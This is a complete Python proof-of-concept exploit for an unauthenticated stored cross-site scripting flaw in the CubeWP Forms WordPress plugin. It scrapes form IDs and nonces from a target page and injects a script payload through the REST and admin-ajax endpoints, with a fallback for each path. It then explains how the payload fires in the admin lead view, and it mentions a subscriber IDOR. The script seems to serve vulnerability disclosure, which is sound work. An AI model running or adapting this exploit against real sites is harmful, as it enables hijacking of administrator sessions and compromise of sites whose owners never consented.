#!/usr/bin/env python3
"""
PoC: Unauthenticated Stored XSS via unknown-field sanitization bypass.

Root cause:
  CubeWp_Sanitize::sanitize_cwp_field() (CubeWP Framework) returns $val raw
  when $field_type == '' (unknown slug). cubewp-forms stores every key from
  $_POST['cwp_custom_form']['fields'] without whitelisting to _cwp_group_fields,
  then outputs it raw in admin (leads.php) and dashboard (dashboard.php -> innerHTML).

Usage:
  python3 poc.py --url=http://localhost:8851/wordpress/poc/
  python3 poc.py --url=https://target/my-form-page/ --field=myevil --payload="<img src=x onerror=alert(document.domain)>"

Only stdlib is used (no pip install needed).
"""

import argparse
import random
import re
import string
import sys
import urllib.parse
import urllib.request
import urllib.error


def rand_str(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def http_get(url, timeout=20):
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "Mozilla/5.0 (PoC cubewp-forms Stored-XSS)"},
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read().decode("utf-8", errors="replace"), r.headers


def http_post(url, fields, timeout=20):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(
        url, data=data,
        headers={
            "User-Agent": "Mozilla/5.0 (PoC cubewp-forms Stored-XSS)",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read().decode("utf-8", errors="replace"), r.headers


def extract_form_id(html):
    m = re.search(
        r'name=["\']cwp_custom_form\[form_id\]["\']\s+value=["\']([^"\']+)["\']',
        html,
    )
    if m:
        return m.group(1).strip()
    m = re.search(
        r'value=["\'](\d+)["\']\s+name=["\']cwp_custom_form\[form_id\]["\']',
        html,
    )
    if m:
        return m.group(1).strip()
    return None


def extract_ajax_and_nonce(html):
    ajax_url = None
    nonce = None
    # wp_localize_script prints \/ escaped slashes: {"ajax_url":"http:\/\/host\/wp-admin\/admin-ajax.php",...}
    m = re.search(r'ajax_url["\']?\s*[:=]\s*["\']([^"\']+admin-ajax\.php[^"\']*)["\']', html)
    if m:
        ajax_url = m.group(1).replace("\\/", "/").replace("\\u0026", "&").replace("&amp;", "&")
    m = re.search(r'security_nonce["\']?\s*[:=]\s*["\']([A-Za-z0-9]{10,})["\']', html)
    if m:
        nonce = m.group(1)
    else:
        # fallback: cubewp_custom_form_submit_params object nearby
        m = re.search(r'cubewp_custom_form_submit_params.*?([a-f0-9]{10,})', html, re.S | re.I)
        if m:
            nonce = m.group(1)
    return ajax_url, nonce


def candidate_wp_bases(page_url):
    """Return WP-root candidates handling subdir installs, longest first."""
    p = urllib.parse.urlparse(page_url)
    root = f"{p.scheme}://{p.netloc}"
    parts = [x for x in p.path.strip("/").split("/") if x]
    bases = []
    # e.g. /wordpress/poc/ -> try /wordpress then /
    for i in range(len(parts) - 1, -1, -1):
        prefix = ("/" + "/".join(parts[:i])) if i > 0 else ""
        bases.append(root + prefix)
    if not bases:
        bases = [root]
    # dedupe preserving order
    seen, out = set(), []
    for b in bases:
        if b not in seen:
            seen.add(b)
            out.append(b)
    return out


def main():
    ap = argparse.ArgumentParser(
        description="CubeWP Forms Stored-XSS PoC (unauth -> admin via unknown field)"
    )
    ap.add_argument("--url", required=True, help="URL of post/page containing [cwpCustomForm], e.g. --url=http://localhost:8851/wordpress/poc/")
    ap.add_argument("--field", default=None, help="Unknown field slug to inject (default: random poc_xss_xxx). Must NOT exist in CubeWP custom fields.")
    ap.add_argument("--payload", default=None, help='XSS payload (default: <img src=x onerror=alert(document.domain)>)')
    ap.add_argument("--lead-id", default=None, dest="lead_id", help="Custom lead_id / form_data_id (default: random poc-xxx)")
    ap.add_argument("--form-id", default=None, dest="form_id", help="Override form_id (skip auto-extract from --url)")
    ap.add_argument("--wp-base", default=None, dest="wp_base", help="Override WP root, e.g. --wp-base=http://localhost:8851/wordpress")
    ap.add_argument("--timeout", type=int, default=20, help="HTTP timeout seconds (default 20)")
    args = ap.parse_args()

    page_url = args.url.strip().strip('"').strip("'")
    field = args.field or ("poc_xss_" + rand_str(6))
    payload = args.payload or "<img src=x onerror=alert(document.domain)>"
    lead_id = args.lead_id or ("poc-" + rand_str(6))

    parsed = urllib.parse.urlparse(page_url)
    if not parsed.scheme or not parsed.netloc:
        print("[-] --url must be absolute http(s) URL", file=sys.stderr)
        sys.exit(2)

    print(f"[*] Fetching form page: {page_url}")
    try:
        _, html, _ = http_get(page_url, timeout=args.timeout)
    except Exception as e:
        print(f"[-] Failed to fetch --url: {e}", file=sys.stderr)
        sys.exit(2)

    form_id = args.form_id or extract_form_id(html)
    if not form_id:
        print("[-] Could not extract cwp_custom_form[form_id] from --url.", file=sys.stderr)
        print('    Open page HTML, find: name="cwp_custom_form[form_id]" value="..."', file=sys.stderr)
        print("    Then re-run with --form-id=<id>.", file=sys.stderr)
        sys.exit(2)
    print(f"[+] form_id = {form_id}")

    scraped_ajax, scraped_nonce = extract_ajax_and_nonce(html)
    if scraped_ajax:
        print(f"[+] scraped ajax_url = {scraped_ajax}")
    if scraped_nonce:
        print(f"[+] scraped security_nonce = {scraped_nonce[:6]}...")

    if args.wp_base:
        wp_bases = [args.wp_base.rstrip("/")]
    elif scraped_ajax:
        # derive WP root from ajax_url: strip /wp-admin/admin-ajax.php
        wp_bases = [scraped_ajax.split("/wp-admin/")[0]] + candidate_wp_bases(page_url)
    else:
        wp_bases = candidate_wp_bases(page_url)
    print(f"[*] WP base candidates: {wp_bases}")

    params_fields = {
        "cwp_query[cwp_custom_form][form_id]": form_id,
        "cwp_query[cwp_custom_form][form_data_id]": lead_id,
        f"cwp_query[cwp_custom_form][fields][{field}]": payload,
    }
    print("[*] Submitting unauthenticated lead via REST:")
    print(f"    lead_id = {lead_id}")
    print(f"    field   = {field}")
    print(f"    payload = {payload}")

    rest_paths = [
        "/wp-json/cubewp-custom-form/v1/submit",
        "/wp-json/cubewp-custom-form/v1/submit/",
    ]
    tried = []
    for base in wp_bases:
        for rp in rest_paths:
            url = base + rp + "?" + urllib.parse.urlencode(params_fields)
            tried.append(url)
            print(f"[*] Trying REST GET {base + rp}")
            try:
                status, body, _ = http_get(url, timeout=args.timeout)
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode("utf-8", errors="replace")
                except Exception:
                    body = ""
                print(f"    -> HTTP {e.code} {body[:200]}")
                if e.code == 404:
                    continue
                # non-404 error: show and continue to next candidate
                continue
            except Exception as e:
                print(f"    -> failed: {e}")
                continue
            print(f"[+] HTTP {status}")
            print(body[:2000])
            if "success" in body.lower() or "submission was successful" in body.lower():
                print_success(lead_id, base)
                return
            print("[!] REST reachable but no success marker, trying next candidate...")
        # plain-permalink fallback: ?rest_route=/...
        plain = base + "/?" + urllib.parse.urlencode(
            {"rest_route": "/cubewp-custom-form/v1/submit", **params_fields}
        )
        tried.append(plain)
        print(f"[*] Trying plain-permalink REST {base}/?rest_route=...")
        try:
            status, body, _ = http_get(plain, timeout=args.timeout)
        except urllib.error.HTTPError as e:
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                body = ""
            print(f"    -> HTTP {e.code} {body[:200]}")
            continue
        except Exception as e:
            print(f"    -> failed: {e}")
            continue
        print(f"[+] HTTP {status}")
        print(body[:2000])
        if "success" in body.lower() or "submission was successful" in body.lower():
            print_success(lead_id, base)
            return

    # Final fallback: admin-ajax POST (needs valid nonce)
    print("[*] REST failed everywhere, trying admin-ajax POST fallback...")
    ajax_candidates = []
    if scraped_ajax:
        ajax_candidates.append(scraped_ajax)
    for base in wp_bases:
        ajax_candidates.append(base + "/wp-admin/admin-ajax.php")
    ajax_candidates = list(dict.fromkeys(ajax_candidates))
    if not scraped_nonce:
        print("[-] No security_nonce scraped from form page; admin-ajax will fail without it.", file=sys.stderr)
        print("    The nonce is printed as cubewp_custom_form_submit_params.security_nonce.", file=sys.stderr)
        print("    If the form page JS is cached/minified, view-source and search 'security_nonce'.", file=sys.stderr)
    else:
        post_fields = {
            "action": "cubewp_submit_custom_form",
            "security_nonce": scraped_nonce,
            "cwp_custom_form[form_id]": form_id,
            "cwp_custom_form[form_data_id]": lead_id,
            f"cwp_custom_form[fields][{field}]": payload,
        }
        for ajax in ajax_candidates:
            print(f"[*] Trying POST {ajax}")
            try:
                status, body, _ = http_post(ajax, post_fields, timeout=args.timeout)
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode("utf-8", errors="replace")
                except Exception:
                    body = ""
                print(f"    -> HTTP {e.code} {body[:500]}")
                continue
            except Exception as e:
                print(f"    -> failed: {e}")
                continue
            print(f"[+] HTTP {status}")
            print(body[:2000])
            if "success" in body.lower() or "submission was successful" in body.lower():
                print_success(lead_id, ajax.rsplit("/wp-admin", 1)[0])
                return

    print("\n[!] All submit paths failed.", file=sys.stderr)
    print("    Tried:", file=sys.stderr)
    for t in tried + ajax_candidates:
        print(f"      - {t[:180]}", file=sys.stderr)
    print("    Check: (a) cubewp-forms + framework active? (b) form_id valid + published? (c) pretty permalinks? Try --wp-base=http://localhost:8851/wordpress explicitly.", file=sys.stderr)
    sys.exit(1)


def print_success(lead_id, base):
    print("\n[+] Submitted. Verify stored XSS:")
    print(f"  1. Login as admin -> CubeWP Forms -> All Leads -> find lead_id '{lead_id}' -> View Details (payload executes).")
    print(f"  2. Direct (needs admin _wpnonce=cwp_edit_group): {base}/wp-admin/admin.php?page=cubewp-custom-form-data&action=edit&leadid={lead_id}")
    print(f"  3. Subscriber IDOR: POST {base}/wp-admin/admin-ajax.php action=cwp_forms_data&lead_id={lead_id} (response.output is innerHTML).")


if __name__ == "__main__":
    main()
